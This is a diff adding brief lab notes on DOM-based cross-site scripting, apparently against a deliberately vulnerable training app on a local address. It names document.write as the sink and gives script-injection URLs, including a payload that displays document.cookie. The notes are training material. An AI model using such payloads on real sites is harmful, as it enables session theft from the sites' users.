@@ -1,0 +1,29 @@
+ xss dom : - 
+xss or cross-site-scripting is an attack that allows the attacker to insert and execute javascript on the victim's website
+there are 3 types of xss attacks, namely:stored,reflected and dom-based.
+
+
+xss dom : (low) : - 
+<?php
+
+# no protections, anything goes
+
+?>
+
+vulnerable functions : - 
+document.write
+
+http://172.17.0.2/vulnerabilities/xss_d/?default=English
+
+change the value defalut parameter to test : - ------
+
+http://172.17.0.2/vulnerabilities/xss_d/?default=Test      ---> it can be seen that the text will be printed on the web page
+
+exploits : - 
+?default=<script>alert("Hacked")</script>
+
+and we insert it into a link like this : - 
+http://172.17.0.2/vulnerabilities/xss_d/?default=<script>alert("Hacked")</script>
+
+we if can get a cookie with the following payload : - 
+<script>alert(document.cookie)</script>
